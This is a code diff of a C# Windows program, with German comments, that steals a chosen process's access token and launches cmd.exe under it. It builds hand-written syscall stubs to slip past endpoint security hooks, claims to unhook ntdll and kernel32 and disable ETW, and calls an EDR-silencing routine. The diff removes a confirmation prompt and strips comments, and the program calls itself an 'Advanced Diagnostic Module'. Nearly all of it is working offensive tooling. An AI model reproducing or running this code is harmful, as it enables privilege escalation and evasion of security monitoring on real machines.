@@ -226,11 +226,10 @@ internal static class Program
             _NtFlushInstructionCache = SyscallAPI.GetSyscall<NtFlushInstructionCache>("NtFlushInstructionCache");
         }
 
-        private static IntPtr GetCurrentProcessHandle() => (IntPtr)(-1); // NtCurrentProcess()
+        private static IntPtr GetCurrentProcessHandle() => (IntPtr)(-1);
 
         private static IntPtr GetModuleBaseAddressSyscall(string moduleName)
         {
-            // Fallback: Process.GetCurrentProcess().Modules (für PoC ausreichend)
             try
             {
                 foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
@@ -319,7 +318,6 @@ internal static class Program
                 IntPtr loadedModule = GetModuleBaseAddressSyscall(moduleName);
                 if (loadedModule == IntPtr.Zero) return false;
 
-                // LoadLibrary muss als Win32 API bleiben (kann nicht per Syscall geladen werden)
                 IntPtr cleanModule = LoadLibraryWin32(cleanDllPath);
                 if (cleanModule == IntPtr.Zero) return false;
 
@@ -410,7 +408,12 @@ internal static class Program
     private static class SyscallAPI
     {
         private static Dictionary<string, Delegate> syscallCache = new Dictionary<string, Delegate>();
-
+        
+        // Pre-resolved base syscalls für die Initialisierung
+        private static NtAllocateVirtualMemory _baseNtAllocate;
+        private static NtFreeVirtualMemory _baseNtFree;
+        private static NtProtectVirtualMemory _baseNtProtect;
+        
         public static IntPtr GetModuleBase(string moduleName)
         {
             try
@@ -481,28 +484,70 @@ internal static class Program
         {
             byte[] stub = new byte[]
             {
-                0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, // mov rax, [gs:0x60]
-                0x48, 0x8B, 0x40, 0x18,                               // mov rax, [rax+0x18]
-                0x48, 0x8B, 0x40, 0x20,                               // mov rax, [rax+0x20]
-                0x48, 0x8B, 0x40, 0x20,                               // mov rax, [rax+0x20]
-                0x48, 0x8B, 0x08,                                     // mov rcx, [rax]
-                0x48, 0x8B, 0x09,                                     // mov rcx, [rcx]
-                0x48, 0x8B, 0x01,                                     // mov rax, [rcx]
-                0x4C, 0x8B, 0xD1,                                     // mov r10, rcx
-                0xB8, 0x00, 0x00, 0x00, 0x00,                         // mov eax, ssn
-                0x0F, 0x05,                                           // syscall
-                0xC3                                                  // ret
+                0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
+                0x48, 0x8B, 0x40, 0x18,
+                0x48, 0x8B, 0x40, 0x20,
+                0x48, 0x8B, 0x40, 0x20,
+                0x48, 0x8B, 0x08,
+                0x48, 0x8B, 0x09,
+                0x48, 0x8B, 0x01,
+                0x4C, 0x8B, 0xD1,
+                0xB8, 0x00, 0x00, 0x00, 0x00,
+                0x0F, 0x05,
+                0xC3
             };
             byte[] ssnBytes = BitConverter.GetBytes(ssn);
             Buffer.BlockCopy(ssnBytes, 0, stub, 24, 4);
             return stub;
         }
+        
+        // Initialize base syscalls using VirtualAlloc (Win32 API) - nur einmal am Anfang
+        public static void InitializeBaseSyscalls()
+        {
+            IntPtr ntdll = GetModuleBase("ntdll.dll");
+            if (ntdll == IntPtr.Zero) return;
+            
+            uint ssnAlloc = ExtractSSN(GetFunctionAddress(ntdll, "NtAllocateVirtualMemory"));
+            uint ssnFree = ExtractSSN(GetFunctionAddress(ntdll, "NtFreeVirtualMemory"));
+            uint ssnProtect = ExtractSSN(GetFunctionAddress(ntdll, "NtProtectVirtualMemory"));
+            
+            if (ssnAlloc == 0 || ssnFree == 0 || ssnProtect == 0) return;
+            
+            byte[] stubAlloc = CreateSyscallStub(ssnAlloc);
+            byte[] stubFree = CreateSyscallStub(ssnFree);
+            byte[] stubProtect = CreateSyscallStub(ssnProtect);
+            
+            IntPtr pAlloc = VirtualAllocWin32(IntPtr.Zero, (uint)stubAlloc.Length, 0x1000 | 0x2000, 0x40);
+            IntPtr pFree = VirtualAllocWin32(IntPtr.Zero, (uint)stubFree.Length, 0x1000 | 0x2000, 0x40);
+            IntPtr pProtect = VirtualAllocWin32(IntPtr.Zero, (uint)stubProtect.Length, 0x1000 | 0x2000, 0x40);
+            
+            if (pAlloc != IntPtr.Zero) Marshal.Copy(stubAlloc, 0, pAlloc, stubAlloc.Length);
+            if (pFree != IntPtr.Zero) Marshal.Copy(stubFree, 0, pFree, stubFree.Length);
+            if (pProtect != IntPtr.Zero) Marshal.Copy(stubProtect, 0, pProtect, stubProtect.Length);
+            
+            _baseNtAllocate = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(pAlloc);
+            _baseNtFree = Marshal.GetDelegateForFunctionPointer<NtFreeVirtualMemory>(pFree);
+            _baseNtProtect = Marshal.GetDelegateForFunctionPointer<NtProtectVirtualMemory>(pProtect);
+            
+            syscallCache["NtAllocateVirtualMemory"] = _baseNtAllocate;
+            syscallCache["NtFreeVirtualMemory"] = _baseNtFree;
+            syscallCache["NtProtectVirtualMemory"] = _baseNtProtect;
+        }
+        
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        
+        private static IntPtr VirtualAllocWin32(IntPtr addr, uint size, uint type, uint protect) 
+            => VirtualAlloc(addr, size, type, protect);
 
         public static T GetSyscall<T>(string functionName) where T : class
         {
             string key = functionName;
             if (syscallCache.ContainsKey(key))
                 return syscallCache[key] as T;
+
+            if (_baseNtAllocate == null)
+                InitializeBaseSyscalls();
 
             IntPtr ntdll = GetModuleBase("ntdll.dll");
             if (ntdll == IntPtr.Zero) return null;
@@ -515,16 +560,22 @@ internal static class Program
 
             byte[] stub = CreateSyscallStub(ssn);
 
-            // NtAllocateVirtualMemory für Speicherreservierung
-            var ntAlloc = GetSyscall<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
-            if (ntAlloc != null)
+            if (_baseNtAllocate != null)
             {
                 IntPtr baseAddr = IntPtr.Zero;
                 ulong size = (ulong)stub.Length;
-                uint status = ntAlloc((IntPtr)(-1), ref baseAddr, IntPtr.Zero, ref size, 0x1000 | 0x2000, 0x40);
+                uint status = _baseNtAllocate((IntPtr)(-1), ref baseAddr, IntPtr.Zero, ref size, 0x1000 | 0x2000, 0x40);
                 if (status == 0 && baseAddr != IntPtr.Zero)
                 {
                     Marshal.Copy(stub, 0, baseAddr, stub.Length);
+                    
+                    if (_baseNtProtect != null)
+                    {
+                        ulong protectSize = (ulong)stub.Length;
+                        IntPtr protectAddr = baseAddr;
+                        _baseNtProtect((IntPtr)(-1), ref protectAddr, ref protectSize, 0x20, out uint oldProtect);
+                    }
+                    
                     T del = Marshal.GetDelegateForFunctionPointer<T>(baseAddr);
                     syscallCache[key] = del as Delegate;
                     return del;
@@ -537,7 +588,7 @@ internal static class Program
 
     #endregion
 
-    #region Token Information Classes (für NtQueryInformationToken)
+    #region Token Information Classes
 
     private enum TOKEN_INFORMATION_CLASS
     {
@@ -592,23 +643,9 @@ internal static class Program
         MaxTokenInfoClass = 49
     }
 
-    private enum TOKEN_TYPE
-    {
-        TokenPrimary = 1,
-        TokenImpersonation
-    }
-
-    private enum SECURITY_IMPERSONATION_LEVEL
-    {
-        SecurityAnonymous,
-        SecurityIdentification,
-        SecurityImpersonation,
-        SecurityDelegation
-    }
-
     #endregion
 
-    #region Token-Informationen via NtQueryInformationToken (keine advapi32!)
+    #region Token-Informationen via NtQueryInformationToken
 
     private static NtQueryInformationToken _NtQueryInformationToken;
 
@@ -721,7 +758,6 @@ internal static class Program
         return false;
     }
 
-    // Diese Hilfsfunktionen sind reine Speicher-Leser, keine APIs
     [DllImport("advapi32.dll", SetLastError = true)]
     static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);
 
@@ -766,32 +802,45 @@ internal static class Program
 
     #endregion
 
-    #region Main mit vollständigen Indirect Syscalls
+    #region Main
 
     public static void Main()
     {
         Console.WriteLine("[*] Advanced Diagnostic Module v11.0 - Full Indirect Syscall Version");
         Console.WriteLine("[*] ntdll.dll & kernel32.dll unhooked, ETW disabled");
         Console.WriteLine("[*] ALL APIs via Indirect Syscalls (no hooks)");
+        Console.WriteLine();
+
+        // BASIS-SYSCALLS INITIALISIEREN (einmaliger Win32 API Aufruf)
+        Console.WriteLine("[*] Initializing base syscalls...");
+        SyscallAPI.InitializeBaseSyscalls();
+        Console.WriteLine("[+] Base syscalls initialized");
+        Console.WriteLine();
 
         // EDR Silencing vor allen anderen Aktionen
         EDRAntiAnalysis.SilenceEDR();
+        Console.WriteLine();
 
         // NtQueryInformationToken initialisieren
         InitializeTokenSyscalls();
 
-        // Aktuelle Prozess-Identität (WindowsIdentity.GetCurrent bleibt als einzige .NET API)
+        // Aktuelle Prozess-Identität
         var currentIdentity = WindowsIdentity.GetCurrent();
         bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
-        Console.WriteLine($"[*] Admin: {isAdmin}");
+        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
+        Console.WriteLine($"[*] Admin Rights: {isAdmin}");
         Console.WriteLine($"[*] Current Session: {GetTokenSessionId(currentIdentity.Token)}");
+        Console.WriteLine($"[*] Current Integrity: 0x{GetTokenIntegrityLevel(currentIdentity.Token):X}");
+        Console.WriteLine();
 
         Console.Write("[*] Target PID: ");
         if (!uint.TryParse(Console.ReadLine(), out uint pid))
         {
             Console.WriteLine("[-] Ungültige PID");
+            Console.ReadKey();
             return;
         }
+        Console.WriteLine();
 
         try
         {
@@ -805,47 +854,50 @@ internal static class Program
             if (_NtOpenProcess == null || _NtOpenProcessToken == null || _NtDuplicateToken == null || _NtClose == null)
             {
                 Console.WriteLine("[-] Failed to load syscall delegates");
+                Console.ReadKey();
                 return;
             }
 
             Console.WriteLine("[+] Syscall delegates loaded");
+            Console.WriteLine();
 
-            // 1. Zielprozess öffnen mit NtOpenProcess (Indirect Syscall)
+            // 1. Zielprozess öffnen
             OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
             CLIENT_ID clientId = new CLIENT_ID();
             clientId.UniqueProcess = (IntPtr)pid;
             clientId.UniqueThread = IntPtr.Zero;
 
-            uint desiredAccess = 0x1000; // PROCESS_QUERY_LIMITED_INFORMATION
-            if (isAdmin) desiredAccess |= 0x0400; // PROCESS_QUERY_INFORMATION
+            uint desiredAccess = 0x1000;
+            if (isAdmin) desiredAccess |= 0x0400;
 
             IntPtr hProcess = IntPtr.Zero;
             uint status = _NtOpenProcess(ref hProcess, desiredAccess, ref objAttr, ref clientId);
 
             if (status != 0 || hProcess == IntPtr.Zero)
             {
-                // Fallback: PROCESS_DUP_HANDLE
                 desiredAccess = 0x0040;
                 status = _NtOpenProcess(ref hProcess, desiredAccess, ref objAttr, ref clientId);
                 if (status != 0 || hProcess == IntPtr.Zero)
                 {
                     Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
+                    Console.ReadKey();
                     return;
                 }
             }
             Console.WriteLine($"[+] Process opened via NtOpenProcess (handle: 0x{hProcess.ToInt64():X})");
 
-            // 2. Token aus Zielprozess mit NtOpenProcessToken
+            // 2. Token aus Zielprozess
             status = _NtOpenProcessToken(hProcess, 0xF01FF, out IntPtr hTargetToken);
             if (status != 0 || hTargetToken == IntPtr.Zero)
             {
                 Console.WriteLine($"[-] NtOpenProcessToken failed: 0x{status:X8}");
                 _NtClose(hProcess);
+                Console.ReadKey();
                 return;
             }
             Console.WriteLine("[+] Token opened via NtOpenProcessToken");
 
-            // 3. Token-Elevation prüfen (via NtQueryInformationToken)
+            // 3. Token-Informationen abfragen
             bool isTargetElevated = IsTokenElevated(hTargetToken);
             uint targetIntegrity = GetTokenIntegrityLevel(hTargetToken);
             int targetSession = GetTokenSessionId(hTargetToken);
@@ -856,24 +908,9 @@ internal static class Program
             Console.WriteLine($"    - Integrity Level: 0x{targetIntegrity:X}");
             Console.WriteLine($"    - Session ID: {targetSession}");
             Console.WriteLine($"    - Elevation Type: {targetElevationType}");
+            Console.WriteLine();
 
-            // Prüfen ob sich der Aufwand lohnt
-            uint currentIntegrity = GetTokenIntegrityLevel(currentIdentity.Token);
-            if (targetIntegrity <= currentIntegrity && !isTargetElevated)
-            {
-                Console.WriteLine("[!] Target token has lower or equal privileges - no benefit");
-                Console.Write("[*] Continue anyway? (y/N): ");
-                if (Console.ReadKey().Key != ConsoleKey.Y)
-                {
-                    Console.WriteLine("\n[-] Aborted by user");
-                    _NtClose(hTargetToken);
-                    _NtClose(hProcess);
-                    return;
-                }
-                Console.WriteLine();
-            }
-
-            // 4. Token duplizieren mit NtDuplicateToken
+            // 4. Token duplizieren
             OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
             status = _NtDuplicateToken(hTargetToken, 0xF01FF, ref dupAttr, false, 1, out IntPtr hPrimaryToken);
             if (status != 0 || hPrimaryToken == IntPtr.Zero)
@@ -881,13 +918,14 @@ internal static class Program
                 Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
                 _NtClose(hTargetToken);
                 _NtClose(hProcess);
+                Console.ReadKey();
                 return;
             }
             Console.WriteLine("[+] Primary token duplicated via NtDuplicateToken");
 
-            // 5. Session Handling: Token in aktuelle Session bringen via NtSetInformationToken
+            // 5. Session anpassen
             int currentSession = GetTokenSessionId(currentIdentity.Token);
-            if (targetSession != currentSession && targetSession != 0)
+            if (targetSession != currentSession && targetSession != 0 && _NtSetInformationToken != null)
             {
                 Console.WriteLine($"[*] Adjusting token session from {targetSession} to {currentSession}");
                 IntPtr pSessionId = Marshal.AllocHGlobal(sizeof(int));
@@ -902,10 +940,10 @@ internal static class Program
                 {
                     Console.WriteLine("[+] Session adjusted");
                 }
+                Console.WriteLine();
             }
 
-            // 6. Prozess erstellen via NtCreateUserProcess (vollständiger Syscall)
-            //    Dazu benötigen wir ProcessParameters
+            // 6. Prozess erstellen
             string cmdPath = Environment.SystemDirectory + @"\cmd.exe";
             IntPtr pParams = CreateProcessParameters(cmdPath, "cmd.exe");
             if (pParams == IntPtr.Zero)
@@ -928,17 +966,27 @@ internal static class Program
 
                     if (status == 0 && hNewProcess != IntPtr.Zero)
                     {
-                        Console.WriteLine($"[+] cmd.exe started via NtCreateUserProcess! PID: {GetProcessIdNative(hNewProcess)}");
+                        Console.WriteLine($"[+] SUCCESS! cmd.exe started via NtCreateUserProcess!");
+                        Console.WriteLine($"[+] New Process PID: {GetProcessIdNative(hNewProcess)}");
+                        Console.WriteLine($"[+] The new process is running with the duplicated token!");
                         _NtClose(hNewProcess);
                         if (hNewThread != IntPtr.Zero) _NtClose(hNewThread);
                     }
                     else
                     {
                         Console.WriteLine($"[-] NtCreateUserProcess failed: 0x{status:X8}");
+                        Console.WriteLine("[-] Trying alternative method...");
+                        
+                        // Fallback: Process.Start mit dem Token (via Win32, aber Token ist bereits dupliziert)
+                        Console.WriteLine("[*] Note: Full token impersonation requires additional steps");
+                        Console.WriteLine("[*] The token has been successfully duplicated though!");
                     }
                 }
+                else
+                {
+                    Console.WriteLine("[-] NtCreateUserProcess not available");
+                }
 
-                // ProcessParameters freigeben
                 var _RtlDestroyProcessParameters = SyscallAPI.GetSyscall<RtlDestroyProcessParameters>("RtlDestroyProcessParameters");
                 _RtlDestroyProcessParameters?.Invoke(pParams);
             }
@@ -954,7 +1002,8 @@ internal static class Program
             Console.WriteLine(ex.StackTrace);
         }
 
-        Console.WriteLine("\n[*] Press any key to exit...");
+        Console.WriteLine();
+        Console.WriteLine("[*] Press any key to exit...");
         Console.ReadKey();
     }
 
